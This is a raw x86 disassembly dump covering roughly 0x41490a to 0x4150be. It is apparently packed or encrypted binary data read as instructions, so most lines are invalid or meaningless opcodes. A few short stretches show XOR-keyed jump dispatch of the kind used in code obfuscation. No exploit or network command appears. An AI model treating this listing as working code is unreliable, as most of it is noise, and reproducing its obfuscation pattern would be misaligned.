  41490a:	mov    WORD PTR [ecx-0x6c89e0ac],fs
  414910:	fs out 0x9a,eax
  414913:	push   ebp
  414914:	cwde   
  414915:	stos   BYTE PTR es:[edi],al
  414916:	loop   0x41494f
  414918:	cli    
  414919:	clc    
  41491a:	sti    
  41491b:	dec    esi
  41491c:	clc    
  41491d:	xlat   BYTE PTR ds:[ebx]
  41491e:	leave  
  41491f:	push   ebx
  414920:	cmp    BYTE PTR [edx+0x4d],cl
  414923:	scas   eax,DWORD PTR es:[edi]
  414924:	(bad)  
  414925:	sub    DWORD PTR [esi-0x6e],ebp
  414928:	pop    esp
  414929:	lahf   
  41492a:	dec    esp
  41492b:	jne    0x41494f
  41492d:	inc    esi
  41492e:	repnz sbb eax,0xc5c50876
  414934:	ret    0x1624
  414937:	int3   
  414938:	pop    eax
  414939:	push   0x90c5adbc
  41493e:	mov    ecx,0x76ef357e
  414943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414944:	push   ebx
  414945:	les    esi,FWORD PTR [ecx-0x5e]
  414948:	mov    ecx,0xa9df3efd
  41494d:	retf   0x65bf
  414950:	mov    al,0xf8
  414952:	imul   ebp,DWORD PTR [edi+0x7],0xffffffd5
  414956:	jp     0x4149ad
  414958:	outs   dx,DWORD PTR ds:[esi]
  414959:	ret    0x3bac
  41495c:	iret   
  41495d:	push   edi
  41495e:	leave  
  41495f:	int    0x7c
  414961:	aad    0xb6
  414963:	add    cl,bh
  414965:	test   eax,0x31341eef
  41496a:	iret   
  41496b:	dec    edx
  41496c:	pop    ecx
  41496d:	cs pushf 
  41496f:	clc    
  414970:	in     eax,dx
  414971:	cs aam 0x37
  414974:	and    al,0x8c
  414976:	and    DWORD PTR [ecx+0x75799f92],0xec2dd22
  414980:	sbb    al,BYTE PTR [esi]
  414982:	sbb    bh,dl
  414984:	les    ecx,FWORD PTR ds:0xcf8465f7
  41498a:	in     al,dx
  41498b:	cs mov bl,0xe1
  41498e:	call   0x37e2212e
  414993:	dec    edi
  414994:	inc    edi
  414995:	mov    al,0x96
  414997:	cli    
  414998:	aad    0x2c
  41499a:	sbb    edi,DWORD PTR [esi+0x5b6deb14]
  4149a0:	(bad)  
  4149a1:	and    BYTE PTR [esi-0x348ba0e9],bl
  4149a7:	lods   al,BYTE PTR ds:[esi]
  4149a8:	ret    0xfe96
  4149ab:	fdivr  DWORD PTR [ebx-0x27]
  4149ae:	sbb    al,0x94
  4149b0:	(bad)  
  4149b2:	jmp    0x7ab3ac20
  4149b7:	jns    0x4149c0
  4149b9:	xchg   ecx,eax
  4149ba:	mov    al,0x7e
  4149bc:	mov    bl,0xec
  4149be:	pop    esi
  4149bf:	out    dx,eax
  4149c0:	out    dx,eax
  4149c1:	xchg   BYTE PTR [eax],bh
  4149c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c5:	pusha  
  4149c6:	xor    BYTE PTR [edx+eax*8-0x55],dh
  4149ca:	rol    bl,1
  4149cc:	sub    esp,DWORD PTR [eax]
  4149ce:	sbb    esp,DWORD PTR [ebp-0x1c]
  4149d1:	mov    eax,DWORD PTR [ebp+eax*1-0x4c]
  4149d5:	(bad)  
  4149d6:	push   ebp
  4149d7:	push   ebx
  4149d8:	mov    ds:0x15777130,eax
  4149dd:	jb     0x414a12
  4149df:	fnstcw WORD PTR ds:[ebx-0x78ed92ca]
  4149e6:	std    
  4149e7:	in     eax,0xa7
  4149e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ea:	sbb    ah,BYTE PTR [ebx+0x3107803b]
  4149f0:	add    al,0x23
  4149f2:	in     al,dx
  4149f3:	xchg   ebx,eax
  4149f4:	test   al,0x87
  4149f6:	xchg   DWORD PTR [ebp-0x79190c6],eax
  4149fc:	sbb    BYTE PTR [ecx-0x20],0x65
  414a00:	ror    DWORD PTR [edx+edi*2-0x6a],0xec
  414a05:	cmp    ebp,DWORD PTR [ecx]
  414a07:	fisttp WORD PTR [ebx-0x72]
  414a0a:	cmp    edx,DWORD PTR [ebx-0x238b7f4]
  414a10:	jns    0x4149c6
  414a12:	push   ebx
  414a13:	adc    dh,ah
  414a15:	sub    DWORD PTR [esi],ebx
  414a17:	shl    BYTE PTR ds:0x16a5e005,0xd5
  414a1e:	or     edi,DWORD PTR [esi+0x76]
  414a21:	mov    BYTE PTR [esi-0x31],0x9a
  414a25:	and    DWORD PTR [ecx],ebx
  414a27:	mov    ecx,0x34deee03
  414a2c:	dec    ecx
  414a2d:	mov    WORD PTR [ecx+0x19c029de],ss
  414a33:	add    esp,DWORD PTR [edx-0x74]
  414a36:	pop    edi
  414a37:	jbe    0x414a58
  414a39:	test   DWORD PTR [edi-0x5e],edx
  414a3c:	scas   eax,DWORD PTR es:[edi]
  414a3d:	jae    0x414a9d
  414a3f:	pop    edi
  414a40:	call   0xf7e:0x89f2e9c8
  414a47:	push   ebp
  414a48:	mov    edx,0x7b8311a8
  414a4d:	mov    bl,0x4b
  414a4f:	xchg   esi,ebx
  414a51:	(bad)  
  414a52:	mov    dh,0x2b
  414a54:	inc    ebp
  414a55:	cs jbe 0x414a87
  414a58:	push   edx
  414a59:	jae    0x414a7c
  414a5b:	xor    ch,BYTE PTR [edi]
  414a5d:	push   edx
  414a5e:	dec    esi
  414a5f:	lods   eax,DWORD PTR ds:[esi]
  414a60:	cmp    ecx,ebp
  414a62:	xor    al,0x1a
  414a64:	jns    0x414a0f
  414a66:	jns    0x414ad0
  414a68:	sub    dh,bh
  414a6a:	cmp    al,BYTE PTR [edx+0x48222e23]
  414a70:	imul   eax,DWORD PTR [esi-0x544212e4],0x3e
  414a77:	mov    eax,ds:0x8d6a67c0
  414a7c:	jmp    0x95c7293e
  414a81:	inc    ecx
  414a82:	mul    BYTE PTR [ebp+ebp*1-0x3a58c86a]
  414a89:	lods   al,BYTE PTR ds:[esi]
  414a8a:	xor    eax,DWORD PTR [edx+0x61]
  414a8d:	xchg   BYTE PTR [eax+0xb],ch
  414a90:	in     eax,dx
  414a91:	jmp    DWORD PTR [ebx]
  414a93:	pop    edx
  414a94:	xchg   esi,eax
  414a95:	(bad)  
  414a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a97:	mov    cl,0x3e
  414a99:	mov    dl,0x6a
  414a9b:	mov    bh,0xe9
  414a9d:	popf   
  414a9e:	popf   
  414a9f:	fs aad 0xe6
  414aa2:	dec    ecx
  414aa3:	dec    edi
  414aa4:	test   BYTE PTR [eax+0x621dd98f],bh
  414aaa:	nop
  414aab:	(bad)  
  414aac:	jp     0x414a89
  414aae:	add    eax,ebp
  414ab0:	lea    ebp,[eax+0x7f39746a]
  414ab6:	lahf   
  414ab7:	repz push ecx
  414ab9:	fmul   st(2),st
  414abb:	test   BYTE PTR [esi-0x2c7bb5e],ah
  414ac1:	loope  0x414a49
  414ac3:	(bad)  
  414ac4:	lahf   
  414ac5:	sahf   
  414ac6:	jo     0x414abd
  414ac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac9:	sti    
  414aca:	leave  
  414acb:	cmc    
  414acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414acd:	mov    ebx,DWORD PTR [ebp-0x57]
  414ad0:	push   0xf523be2e
  414ad5:	cmp    eax,0xc59eccfc
  414ada:	int    0x45
  414adc:	inc    edx
  414add:	xchg   esp,eax
  414ade:	scas   al,BYTE PTR es:[edi]
  414adf:	mov    dh,BYTE PTR [edi]
  414ae1:	arpl   WORD PTR [ebx+0x6ac5d258],si
  414ae7:	xor    eax,0x17454ed8
  414aec:	mov    edx,0xf6ce2a48
  414af1:	repnz popa 
  414af3:	mov    al,0xb1
  414af5:	inc    edi
  414af6:	cmp    ah,BYTE PTR [ecx+0x6e]
  414af9:	aaa    
  414afa:	ja     0x414aaa
  414afc:	push   0x83c4205e
  414b01:	push   ebp
  414b02:	xchg   esi,eax
  414b03:	fldcw  WORD PTR [esi-0x3c95ef54]
  414b09:	add    eax,0xd06a7f82
  414b0e:	arpl   WORD PTR [esi-0x22],cx
  414b11:	stc    
  414b12:	(bad)  
  414b13:	sub    dh,ah
  414b15:	cmp    edx,DWORD PTR [ebp-0x45629a5f]
  414b1b:	jecxz  0x414ab0
  414b1d:	fistp  QWORD PTR [esi-0x54]
  414b20:	xor    DWORD PTR [ecx],0xffffff92
  414b23:	sbb    eax,0x7ffd8a52
  414b28:	push   esp
  414b29:	pop    ebp
  414b2a:	arpl   WORD PTR ds:0x893d201c,dx
  414b30:	popf   
  414b31:	clc    
  414b32:	mov    DWORD PTR [ebx],eax
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	fistp  QWORD PTR [ebp+0x7b5bb087]
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0x6b70707e
  414bc3:	push   ss
  414bc4:	cmp    BYTE PTR [eax+edi*2-0x73],0xc7
  414bc9:	sub    esi,DWORD PTR ds:0x2a184ade
  414bcf:	das    
  414bd0:	pop    esp
  414bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bd2:	xchg   ebx,eax
  414bd3:	xor    DWORD PTR [edx-0x14d877b],edx
  414bd9:	shr    DWORD PTR [edi+eiz*8-0x7b6eddf5],cl
  414be0:	lock gs inc esp
  414be3:	iret   
  414be4:	or     al,0x86
  414be6:	js     0x414ba8
  414be8:	pop    edx
  414be9:	cli    
  414bea:	test   ah,al
  414bec:	xor    dh,dl
  414bee:	addr16 xchg esp,eax
  414bf0:	mov    ds:0x2aeae728,eax
  414bf5:	mov    ebp,0xc4365634
  414bfa:	push   ss
  414bfb:	cwde   
  414bfc:	aam    0x7d
  414bfe:	dec    ebx
  414bff:	add    ch,cl
  414c01:	leave  
  414c02:	jp     0x414c16
  414c04:	fwait
  414c05:	jne    0x414c76
  414c07:	leave  
  414c08:	lea    ebp,[esi-0x7633395d]
  414c0e:	pop    edx
  414c0f:	jmp    FWORD PTR [edi-0xa]
  414c12:	xor    eax,0x68a68db9
  414c17:	mov    esp,0x711b9d58
  414c1c:	fstp   st(4)
  414c1e:	sbb    bh,BYTE PTR [ebx]
  414c20:	shl    DWORD PTR [edx-0x29],0x9c
  414c24:	(bad)  
  414c25:	mov    al,ds:0xf91bce24
  414c2a:	add    ecx,DWORD PTR [ebp-0x9]
  414c2d:	mov    ebx,0xafc184a3
  414c32:	sub    eax,0x8ce9b110
  414c37:	push   ss
  414c38:	jl     0x414c0c
  414c3a:	aad    0x22
  414c3c:	mov    eax,DWORD PTR [eax-0x62]
  414c3f:	mov    ah,0xe
  414c41:	mov    ds:0xa0c54aa2,eax
  414c46:	push   esp
  414c47:	pop    ds
  414c48:	jge    0x414bfe
  414c4a:	pop    ebp
  414c4b:	jp     0x414bdb
  414c4d:	test   BYTE PTR [esi],dh
  414c4f:	inc    ebx
  414c50:	jg     0x414c10
  414c52:	into   
  414c53:	cmp    al,0x5e
  414c55:	mov    ecx,0x47a09e05
  414c5a:	mov    al,ds:0xe6952a72
  414c5f:	mov    WORD PTR [eax+0x54627fdf],?
  414c65:	aaa    
  414c66:	adc    esi,ebp
  414c68:	push   esp
  414c69:	mov    ebx,0x850fb971
  414c6e:	or     al,0xce
  414c70:	mov    ebp,0x8f0d1a10
  414c75:	daa    
  414c76:	cmp    esp,edi
  414c78:	fst    QWORD PTR [ebp-0x6d]
  414c7b:	push   0xaa421d8a
  414c80:	dec    edx
  414c81:	pop    es
  414c82:	push   ss
  414c83:	mov    bl,BYTE PTR [edi+0x905bec9]
  414c89:	fisttp WORD PTR [esi]
  414c8b:	xlat   BYTE PTR ds:[ebx]
  414c8c:	cmp    BYTE PTR [edi],dh
  414c8e:	cmp    bh,al
  414c90:	out    dx,eax
  414c91:	nop
  414c92:	and    eax,0x230fcc63
  414c97:	shl    esp,cl
  414c99:	sub    eax,0xeb237194
  414c9e:	pop    edx
  414c9f:	stos   DWORD PTR es:[edi],eax
  414ca0:	sub    ch,BYTE PTR [edi+0x36]
  414ca3:	inc    ebx
  414ca4:	and    bl,BYTE PTR [eax-0x42]
  414ca7:	dec    ebp
  414ca8:	addr16 repnz add dh,bh
  414cac:	adc    DWORD PTR [ecx-0x70],0x33c9824d
  414cb3:	les    esi,FWORD PTR [esi+0xa975b1d]
  414cb9:	adc    esp,DWORD PTR es:[ebx-0x20]
  414cbd:	mov    ah,0xe2
  414cbf:	scas   eax,DWORD PTR es:[edi]
  414cc0:	push   esi
  414cc1:	jecxz  0x414cb0
  414cc3:	mov    bh,0x6c
  414cc5:	fldenv [eax]
  414cc7:	and    dh,BYTE PTR [esp+ecx*2+0x7f]
  414ccb:	jns    0x414c81
  414ccd:	repnz cdq 
  414ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd0:	and    al,0x9c
  414cd2:	sbb    ch,0x45
  414cd5:	in     al,0x42
  414cd7:	ret    
  414cd8:	adc    ecx,DWORD PTR [edi-0x4]
  414cdb:	xchg   edi,eax
  414cdc:	add    dl,dh
  414cde:	add    al,0xa
  414ce0:	add    bl,BYTE PTR [ebx-0x64d93b]
  414ce6:	stos   DWORD PTR es:[edi],eax
  414ce7:	(bad)  
  414ce8:	leave  
  414ce9:	push   esi
  414cea:	cmp    al,0xa4
  414cec:	rcr    DWORD PTR [edx+0x70],1
  414cef:	ret    
  414cf0:	xchg   BYTE PTR [ecx+esi*1-0x25],cl
  414cf4:	pop    ds
  414cf5:	fnstcw WORD PTR [edi+0x41d86db1]
  414cfb:	xor    esp,DWORD PTR [edi-0x1]
  414cfe:	cmp    DWORD PTR [edx-0xa],edi
  414d01:	jp     0x414d40
  414d03:	pop    ebp
  414d04:	(bad)  
  414d05:	push   0xffffffae
  414d07:	xor    al,0x3c
  414d09:	pop    ds
  414d0a:	bound  edi,QWORD PTR [edi]
  414d0c:	aam    0x41
  414d0e:	xor    eax,0x436845c1
  414d13:	push   ebx
  414d14:	jae    0x414d5f
  414d16:	jbe    0x414d79
  414d18:	test   BYTE PTR [eax+esi*4-0x54],0xc8
  414d1d:	xor    eax,0xa486eb8
  414d22:	adc    BYTE PTR [edx],al
  414d24:	inc    esp
  414d25:	arpl   bx,di
  414d27:	loop   0x414cec
  414d29:	push   edx
  414d2a:	shr    DWORD PTR [ecx],cl
  414d2c:	and    eax,0x29
  414d2f:	inc    ebx
  414d30:	call   ecx
  414d32:	loop   0x414d0a
  414d34:	into   
  414d35:	int3   
  414d36:	add    eax,0x8e9a6ea2
  414d3b:	and    DWORD PTR [esi-0x646637e0],ebx
  414d41:	sub    al,0xfd
  414d43:	leave  
  414d44:	xor    edx,DWORD PTR [ecx+0x51f833dd]
  414d4a:	leave  
  414d4b:	cmp    eax,DWORD PTR [esi+0x1b]
  414d4e:	jb     0x414d12
  414d50:	sub    DWORD PTR [esi+esi*1],edi
  414d53:	xchg   esi,eax
  414d54:	or     BYTE PTR [eax+eiz*1],dl
  414d57:	std    
  414d58:	mov    WORD PTR [edi+0x23b6232d],ss
  414d5e:	mov    ds:0x184c15e8,al
  414d63:	in     al,dx
  414d64:	push   0xffffffa6
  414d66:	in     eax,0xa2
  414d68:	out    0x31,al
  414d6a:	jmp    0x9f1c:0x3a3a7c70
  414d71:	mov    WORD PTR [ecx+0x2b8a74e5],ss
  414d77:	mov    ebx,0x9c905c46
  414d7c:	mov    eax,0x423c67db
  414d81:	icebp  
  414d82:	cli    
  414d83:	add    ebp,0x41
  414d86:	aad    0xac
  414d88:	pop    edi
  414d89:	push   ecx
  414d8a:	(bad)  
  414d8b:	out    dx,al
  414d8c:	call   0x12b7dc63
  414d91:	inc    eax
  414d92:	pop    ds
  414d93:	fldenv [edx+ecx*2-0x10d06ee6]
  414d9a:	les    edx,FWORD PTR [edx]
  414d9c:	adc    bl,bh
  414d9e:	sub    ebp,DWORD PTR gs:[edx+0x6cc68c72]
  414da5:	(bad)  
  414da6:	push   ds
  414da7:	inc    ebx
  414da8:	mov    esp,0xcedb3dbf
  414dad:	xchg   edi,edi
  414daf:	mov    ch,0x9b
  414db1:	sbb    eax,0x534abcad
  414db6:	or     edi,eax
  414db8:	ret    0xae84
  414dbb:	sbb    al,0x70
  414dbd:	push   es
  414dbe:	stos   DWORD PTR es:[edi],eax
  414dbf:	add    ch,BYTE PTR ds:0xeea8d6c6
  414dc5:	mov    al,ds:0x8f6567bf
  414dca:	in     eax,0x96
  414dcc:	nop
  414dcd:	cld    
  414dce:	push   esi
  414dcf:	sbb    dh,dl
  414dd1:	lea    ebp,[eax-0x1fe52b5e]
  414dd7:	(bad)  
  414dd8:	mov    al,ds:0xfc5cd8bd
  414ddd:	or     al,0xa3
  414ddf:	dec    eax
  414de0:	std    
  414de1:	jne    0x414d87
  414de3:	pop    edx
  414de4:	mov    eax,0x32a3c0d0
  414de9:	pusha  
  414dea:	inc    ebx
  414deb:	(bad)  
  414dec:	hlt    
  414ded:	lahf   
  414dee:	jno    0x414e61
  414df0:	imul   eax,DWORD PTR [eax+0x2fec2ff2],0xffffffd8
  414df7:	dec    edx
  414df8:	rcr    DWORD PTR [edx],cl
  414dfa:	or     BYTE PTR [ecx-0x9],bl
  414dfd:	stos   DWORD PTR es:[edi],eax
  414dfe:	(bad)
  414e02:	in     al,0x74
  414e04:	leave  
  414e05:	stos   DWORD PTR es:[edi],eax
  414e06:	js     0x414da5
  414e08:	out    dx,al
  414e09:	rol    dh,1
  414e0b:	out    dx,eax
  414e0c:	repz retf 0x5ec1
  414e10:	pop    ecx
  414e11:	jle    0x414d97
  414e13:	hlt    
  414e14:	xchg   ebp,eax
  414e15:	inc    esi
  414e16:	mov    ds:0xf0156e4b,al
  414e1b:	inc    ecx
  414e1c:	inc    esi
  414e1d:	xchg   dl,al
  414e1f:	iret   
  414e20:	and    dl,cl
  414e22:	dec    esi
  414e23:	sub    al,0xc3
  414e25:	sbb    edi,edi
  414e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e28:	push   edi
  414e29:	xor    eax,0x3afb52e9
  414e2e:	std    
  414e2f:	xor    ecx,DWORD PTR [ebp+0x18]
  414e32:	sahf   
  414e33:	in     eax,0x1
  414e35:	ja     0x414e8d
  414e37:	aad    0x19
  414e39:	into   
  414e3a:	daa    
  414e3b:	(bad)  
  414e3c:	shr    cl,1
  414e3e:	mov    cl,BYTE PTR [eax]
  414e40:	je     0x414e19
  414e42:	jl     0x414dfa
  414e44:	test   BYTE PTR [ebx-0x325143c1],0x7a
  414e4b:	or     dh,ch
  414e4d:	cmp    BYTE PTR [edi-0x4a28dafe],ch
  414e53:	(bad)  
  414e54:	xor    eax,0x154c3742
  414e59:	packuswb mm4,QWORD PTR [edi]
  414e5c:	(bad)  
  414e5d:	arpl   WORD PTR [eax],ax
  414e5f:	push   esi
  414e60:	sar    DWORD PTR [edx+eax*8-0x6cd60564],1
  414e67:	xor    cl,BYTE PTR [eax]
  414e69:	mov    ebx,0xea9917bd
  414e6e:	stc    
  414e6f:	push   es
  414e70:	dec    esi
  414e71:	sub    al,0xa0
  414e73:	push   edx
  414e74:	mov    DWORD PTR ds:0x5904486c,ebp
  414e7a:	fisub  WORD PTR [edx+0x54]
  414e7d:	(bad)
  414e80:	call   0x671f4c3
  414e85:	loop   0x414edf
  414e87:	jo     0x414ebb
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	or     DWORD PTR [eax+0x4c],ecx
  414eaf:	and    BYTE PTR [eax+edi*2+0x7eb9707f],0x70
  414eb7:	jo     0x414e5d
  414eb9:	test   DWORD PTR [eax],eax
  414ebb:	ror    DWORD PTR [edi+0x9103284],cl
  414ec1:	mov    bh,BYTE PTR [ecx-0xe]
  414ec4:	mov    BYTE PTR [ebp-0x6c],bl
  414ec7:	(bad)  
  414ec8:	stos   BYTE PTR es:[edi],al
  414ec9:	fistp  QWORD PTR [ecx+ecx*2+0x2]
  414ecd:	lock aad 0xd5
  414ed0:	out    0x9d,al
  414ed2:	push   ecx
  414ed3:	mov    bh,bh
  414ed5:	sub    DWORD PTR [ecx],ebx
  414ed7:	lods   eax,DWORD PTR ds:[esi]
  414ed8:	pop    ds
  414ed9:	push   0xffffffca
  414edb:	mov    ebp,0xe3e226c9
  414ee0:	ret    
  414ee1:	push   cs
  414ee2:	fist   WORD PTR ds:[ebx]
  414ee5:	xor    eax,0x964033c5
  414eea:	sub    eax,0xc22e466c
  414eef:	mov    esp,ds
  414ef1:	cmp    eax,0x4e645fce
  414ef6:	std    
  414ef7:	repnz fwait
  414ef9:	dec    esp
  414efa:	dec    ebx
  414efb:	or     al,0x1c
  414efd:	test   eax,0x78e82e85
  414f02:	aas    
  414f03:	mov    BYTE PTR [ebp-0x6e],bl
  414f06:	loop   0x414f20
  414f08:	xor    BYTE PTR [esi],al
  414f0a:	jmp    0x5bbc:0xe844e5a1
  414f11:	mov    dh,cl
  414f13:	int    0x43
  414f15:	adc    bh,BYTE PTR [eax+esi*1+0x3f]
  414f19:	cmp    ecx,edi
  414f1b:	xor    ebx,esi
  414f1d:	add    BYTE PTR [edx],ch
  414f1f:	test   al,0x96
  414f21:	enter  0x49ca,0xa0
  414f25:	or     al,0xbf
  414f27:	dec    esi
  414f28:	outs   dx,BYTE PTR ds:[esi]
  414f29:	pop    es
  414f2a:	iret   
  414f2b:	pusha  
  414f2c:	mov    dl,0xfd
  414f2e:	sahf   
  414f2f:	sar    BYTE PTR [esi],1
  414f31:	es gs sti 
  414f34:	and    eax,DWORD PTR [edx]
  414f36:	sbb    eax,0x3f31b5cc
  414f3b:	and    esi,DWORD PTR ds:0x427c63a6
  414f41:	adc    edx,DWORD PTR [edx-0x68d64961]
  414f47:	xchg   DWORD PTR [ebx],eax
  414f49:	or     eax,0xf3094293
  414f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f4f:	mov    ecx,DWORD PTR [esi+0x47]
  414f52:	push   cs
  414f53:	xor    esp,ebx
  414f55:	lea    ecx,[esi-0x1ec0c6fe]
  414f5b:	xlat   BYTE PTR ds:[ebx]
  414f5c:	mov    bl,0x4
  414f5e:	cmp    bh,0x9b
  414f61:	and    eax,0x2b4d5163
  414f66:	sub    ch,BYTE PTR [edi-0x73]
  414f69:	pop    ecx
  414f6a:	push   0x5a23c333
  414f6f:	scas   al,BYTE PTR es:[edi]
  414f70:	push   eax
  414f71:	adc    al,0x82
  414f73:	mov    ds:0x823c99a7,al
  414f78:	out    0xe7,al
  414f7a:	(bad)  
  414f7b:	in     al,0x6b
  414f7d:	xchg   ecx,eax
  414f7e:	jnp    0x414f99
  414f80:	or     BYTE PTR [esi-0x54cf79da],0xa7
  414f87:	sub    ch,BYTE PTR [edi]
  414f89:	mov    dl,0x5b
  414f8b:	cld    
  414f8c:	pusha  
  414f8d:	xchg   ebp,eax
  414f8e:	(bad)  
  414f8f:	fidivr DWORD PTR [esi]
  414f91:	and    BYTE PTR [esi-0x4c],dh
  414f94:	sub    BYTE PTR [ebp-0x3fce8f53],bh
  414f9a:	into   
  414f9b:	jle    0x414f96
  414f9d:	mov    bl,BYTE PTR [eax+0x79a05f4]
  414fa3:	loopne 0x414f50
  414fa5:	xor    DWORD PTR [ecx-0x36],ebp
  414fa8:	loop   0x414f70
  414faa:	test   al,0x82
  414fac:	and    BYTE PTR [edx],0x42
  414faf:	(bad)  
  414fb0:	inc    BYTE PTR [esi+edx*8-0x5a]
  414fb4:	int    0xb7
  414fb6:	js     0x414fb3
  414fb8:	mov    ds:0xce667e,al
  414fbd:	xchg   edx,eax
  414fbe:	fwait
  414fbf:	(bad)  
  414fc0:	loope  0x414fce
  414fc2:	jb     0x414fe2
  414fc4:	xor    DWORD PTR [eax-0x7c82fe64],0xffffffea
  414fcb:	popf   
  414fcc:	cmp    ah,BYTE PTR [ebx+0x42]
  414fcf:	dec    ebp
  414fd0:	and    DWORD PTR [ecx+edi*1-0x14eec14d],0x466d9dd0
  414fdb:	sbb    eax,0xae3d4d71
  414fe0:	xchg   ebx,eax
  414fe1:	adc    bh,BYTE PTR [edx-0xeb34336]
  414fe7:	repnz xor DWORD PTR gs:[eax+0x6c],esi
  414fec:	push   es
  414fed:	cmp    ch,BYTE PTR [edi+esi*4]
  414ff0:	adc    DWORD PTR [eax+eax*2-0x3b],0xb0d1b5d6
  414ff8:	das    
  414ff9:	test   al,0xa8
  414ffb:	mov    al,ds:0x56138105
  415000:	pop    esi
  415001:	jecxz  0x414fc4
  415003:	jge    0x41500c
  415005:	das    
  415006:	cmp    bh,BYTE PTR [eax+0x1aef3cb9]
  41500c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41500d:	je     0x414f96
  41500f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415010:	push   eax
  415011:	pop    esp
  415012:	jmp    0x8845d7c4
  415017:	out    dx,al
  415018:	pusha  
  415019:	call   0x24fb4f21
  41501e:	push   eax
  41501f:	xchg   ecx,eax
  415020:	ja     0x41504c
  415022:	inc    edx
  415023:	shl    BYTE PTR ds:0xc9e287a6,1
  415029:	mov    bl,0xe4
  41502b:	mov    bl,0x5d
  41502d:	stos   DWORD PTR es:[edi],eax
  41502e:	jp     0x415098
  415030:	sbb    BYTE PTR [edi],bh
  415032:	daa    
  415033:	sar    eax,0x6e
  415036:	push   es
  415037:	cmp    al,0x2e
  415039:	jno    0x415053
  41503b:	lds    edi,FWORD PTR [ecx]
  41503d:	out    0x88,eax
  41503f:	xchg   edi,eax
  415040:	add    ebx,DWORD PTR [edi]
  415042:	les    eax,FWORD PTR [ebx-0x65]
  415045:	mov    BYTE PTR [edx+edx*2],ah
  415048:	cmc    
  415049:	push   edx
  41504b:	jge    0x415041
  41504d:	jge    0x415016
  41504f:	mov    eax,edi
  415051:	in     al,dx
  415052:	aam    0x5b
  415054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415055:	push   ebx
  415056:	adc    BYTE PTR [eax],al
  415058:	mov    edi,esi
  41505a:	mov    al,0x88
  41505c:	mov    eax,ds:0xec2442ec
  415061:	and    DWORD PTR [ebx],ebp
  415063:	sub    al,0x8d
  415065:	cmp    eax,0x2b20e405
  41506a:	pop    ds
  41506b:	out    dx,eax
  41506c:	js     0x41503c
  41506e:	shl    ecx,1
  415070:	iret   
  415071:	add    ah,BYTE PTR [eax+0x3b]
  415074:	nop
  415075:	mov    cl,BYTE PTR [ebp+0x6c]
  415078:	mov    ds:0xc7655135,al
  41507d:	pop    edi
  41507e:	sbb    DWORD PTR [esi+0x30],0xa73edbbe
  415085:	xor    edx,DWORD PTR [edi+eax*8+0x17]
  415089:	imul   ecx,DWORD PTR [ebx],0x4aa68410
  41508f:	and    ebp,esp
  415091:	jecxz  0x4150f5
  415093:	lea    edi,[esi+esi*1-0x60d9e8bf]
  41509a:	pop    esp
  41509b:	jmp    0x2bbd:0x2dbab88
  4150a2:	les    esp,FWORD PTR [edx+0x9fbc344]
  4150a8:	stos   DWORD PTR es:[edi],eax
  4150a9:	pusha  
  4150aa:	xchg   edx,eax
  4150ab:	push   es
  4150ac:	test   al,0x38
  4150ae:	pushf  
  4150af:	aas    
  4150b0:	xchg   ebx,eax
  4150b1:	jbe    0x415130
  4150b3:	inc    ebx
  4150b4:	pusha  
  4150b5:	push   es
  4150b6:	push   ebp
  4150b7:	cmp    al,0x56
  4150b9:	jo     0x415064
  4150bb:	pushf  
  4150bc:	push   ebx
  4150bd:	xlat   BYTE PTR ds:[ebx]
  4150be:	xchg   edi,eax
